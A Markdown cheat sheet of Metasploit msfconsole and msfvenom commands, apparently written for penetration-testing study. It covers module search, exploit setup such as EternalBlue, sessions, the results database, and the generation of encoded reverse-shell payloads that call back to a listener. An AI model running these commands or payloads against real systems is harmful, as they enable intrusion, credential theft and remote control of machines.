# Metasploit Commands

## What are Metasploit Commands?
- Metasploit commands are instructions given to msfconsole
- Each command performs specific task
- Commands are typed at msf6 > prompt
- Some commands work only inside specific modules
- Understanding commands is essential for using Metasploit
- Commands can be combined for powerful workflows

---

## Core Commands

### help
```bash
# show all available commands
help

# show help for specific command
help search
help use
help set
help sessions
```

### version
```bash
# show metasploit version
version
```

### banner
```bash
# show metasploit banner
banner
```

### exit and quit
```bash
# exit metasploit
exit
quit

# force exit
exit -y
```

### clear
```bash
# clear terminal screen
clear
```

---

## Module Commands

### search
```bash
# search by keyword
search eternalblue
search apache
search wordpress
search ms17-010

# search by type
search type:exploit
search type:auxiliary
search type:payload
search type:post
search type:encoder

# search by platform
search platform:windows
search platform:linux
search platform:android
search platform:osx

# search by rank
search rank:excellent
search rank:great
search rank:good

# search by CVE number
search cve:2021-44228
search cve:2017-0144
search cve:2014-0160

# search by author
search author:hdm
search author:egypt

# combined search
search type:exploit platform:windows rank:excellent smb
search type:auxiliary scanner
```

### use
```bash
# use module by full path
use exploit/windows/smb/ms17_010_eternalblue
use auxiliary/scanner/portscan/tcp
use post/windows/gather/hashdump
use payload/windows/meterpreter/reverse_tcp

# use module by search result number
use 0
use 1
use 5

# use encoder
use encoder/x86/shikata_ga_nai
```

### info
```bash
# show info about current module
info

# show info about specific module
info exploit/windows/smb/ms17_010_eternalblue
info auxiliary/scanner/portscan/tcp

# info shows:
# module name
# description
# author
# references CVE links
# options
# targets supported
# reliability rank
```

### back
```bash
# go back to main msf prompt
back
```

### previous
```bash
# go back to previously used module
previous
```

---

## Options Commands

### show
```bash
# show current module options
show options

# show required options only
show missing

# show available payloads
show payloads

# show available targets
show targets

# show advanced options
show advanced

# show evasion options
show evasion

# show all exploits
show exploits

# show all auxiliaries
show auxiliary

# show all payloads
show payloads

# show all encoders
show encoders

# show all post modules
show post

# show all nops
show nops
```

### set
```bash
# set target host
set RHOSTS 192.168.1.1
set RHOSTS 192.168.1.0/24
set RHOSTS 192.168.1.1-192.168.1.254

# set target port
set RPORT 445
set RPORT 80
set RPORT 22

# set local host for reverse connection
set LHOST 192.168.1.100
set LHOST tun0

# set local port for reverse connection
set LPORT 4444
set LPORT 1234
set LPORT 8080

# set payload
set PAYLOAD windows/meterpreter/reverse_tcp
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set PAYLOAD windows/shell/reverse_tcp

# set target index
set TARGET 0
set TARGET 1

# set threads for scanning
set THREADS 10
set THREADS 50

# set verbose output
set VERBOSE true
set VERBOSE false

# set timeout
set TIMEOUT 30

# set username and password
set USERNAME admin
set PASSWORD password123

# set SMB domain
set SMBDomain WORKGROUP

# set URI for web exploits
set TARGETURI /wp-login.php
```

### setg
```bash
# set global options persist across modules
setg LHOST 192.168.1.100
setg LPORT 4444
setg RHOSTS 192.168.1.1

# global options remain when switching modules
```

### unset
```bash
# unset specific option
unset RHOSTS
unset LHOST
unset PAYLOAD

# unset all options
unset all
```

### unsetg
```bash
# unset global option
unsetg LHOST
unsetg RHOSTS

# unset all global options
unsetg all
```

### get
```bash
# get value of specific option
get RHOSTS
get LHOST
get PAYLOAD
```

---

## Execution Commands

### run
```bash
# run current module
run

# run in background as job
run -j

# run with timeout
run -t 60

# run and exit after completion
run -e
```

### exploit
```bash
# run exploit module
exploit

# run exploit in background
exploit -j

# run exploit with no output
exploit -q

# check if target is vulnerable
exploit -c
```

### check
```bash
# check if target is vulnerable
# without actually exploiting
check

# not all modules support this
```

### reload_all
```bash
# reload all modules
reload_all

# useful after adding custom modules
```

---

## Session Commands

### sessions
```bash
# list all active sessions
sessions
sessions -l

# interact with session number 1
sessions -i 1
sessions -i 2

# kill session number 1
sessions -k 1

# kill all sessions
sessions -K

# list sessions with verbose info
sessions -v

# run command on specific session
sessions -c "sysinfo" -i 1

# run command on all sessions
sessions -C "sysinfo"

# upgrade shell session to meterpreter
sessions -u 1

# rename session
sessions -n "webserver" -i 1
```

---

## Job Commands

### jobs
```bash
# list all running jobs
jobs
jobs -l

# kill specific job
jobs -k 1

# kill all jobs
jobs -K

# show verbose job info
jobs -v
```

---

## Database Commands

### db_status
```bash
# check database connection status
db_status
```

### db_connect
```bash
# connect to database
db_connect msf:password@localhost/msf
```

### db_disconnect
```bash
# disconnect from database
db_disconnect
```

### db_nmap
```bash
# run nmap and save results to database
db_nmap -sV 192.168.1.1
db_nmap -sV -sC 192.168.1.0/24
db_nmap -A 192.168.1.1
db_nmap -p 1-65535 192.168.1.1
```

### db_import
```bash
# import scan results into database
db_import /home/kali/nmap_scan.xml
db_import /home/kali/nessus_scan.nessus
```

### db_export
```bash
# export database to file
db_export -f xml /home/kali/results.xml
db_export -f pwdump /home/kali/creds.txt
```

### hosts
```bash
# show all hosts in database
hosts

# show specific columns
hosts -c address,os_name,purpose

# search for specific host
hosts -S 192.168.1.1

# add host manually
hosts -a 192.168.1.1

# delete host
hosts -d 192.168.1.1
```

### services
```bash
# show all services in database
services

# show services for specific host
services -H 192.168.1.1

# show services on specific port
services -p 445

# show services by protocol
services -P tcp

# search services
services -S http
```

### creds
```bash
# show all credentials found
creds

# show credentials for specific host
creds -H 192.168.1.1

# add credential manually
creds add user:admin password:password123 host:192.168.1.1
```

### vulns
```bash
# show all vulnerabilities found
vulns

# show vulnerabilities for specific host
vulns -H 192.168.1.1
```

### loot
```bash
# show all loot collected
loot

# show loot for specific host
loot -H 192.168.1.1
```

### notes
```bash
# show all notes
notes

# add note
notes -a -t important -d "Found admin credentials"

# show notes for specific host
notes -H 192.168.1.1
```

---

## Workspace Commands

### workspace
```bash
# show all workspaces
workspace

# create new workspace
workspace -a project_name
workspace -a client_pentest

# switch to workspace
workspace project_name

# delete workspace
workspace -d project_name

# rename workspace
workspace -r old_name new_name
```

---

## Output Commands

### spool
```bash
# save all output to log file
spool /home/kali/msf_log.txt

# stop logging
spool off
```

### resource
```bash
# run commands from resource script file
resource /home/kali/setup.rc
resource /home/kali/scan.rc

# create resource script
# save commands in .rc file
# one command per line
```

---

## Miscellaneous Commands

### grep
```bash
# filter output of commands
grep -i windows show exploits
grep meterpreter show payloads
grep 445 services
```

### color
```bash
# enable color output
color true

# disable color output
color false
```

### echo
```bash
# print message to console
echo "Starting scan"
echo "Exploitation complete"
```

### sleep
```bash
# pause execution for seconds
sleep 5
sleep 10
```

### makerc
```bash
# save command history to resource file
makerc /home/kali/session.rc
```

---

## msfvenom Commands

### Basic msfvenom Usage
```bash
# list all payloads
msfvenom -l payloads

# list all formats
msfvenom -l formats

# list all encoders
msfvenom -l encoders

# generate windows reverse shell exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe

# generate linux reverse shell elf
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o shell.elf

# generate php reverse shell
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.php

# generate python reverse shell
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.py

# generate with encoding
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe -o encoded_shell.exe
```

---
## Important Points
- Always use search before manually typing module path
- Use show options before running any module
- Set LHOST to your Kali IP not localhost
- Use setg for options used across multiple modules
- Use workspace to organize different engagements
- Use spool to save output for reporting
- Use run -j to run modules without blocking console
- Use sessions -u to upgrade shell to meterpreter
- Tab autocomplete works for all commands
- Always use Metasploit only on authorized systems
```

---
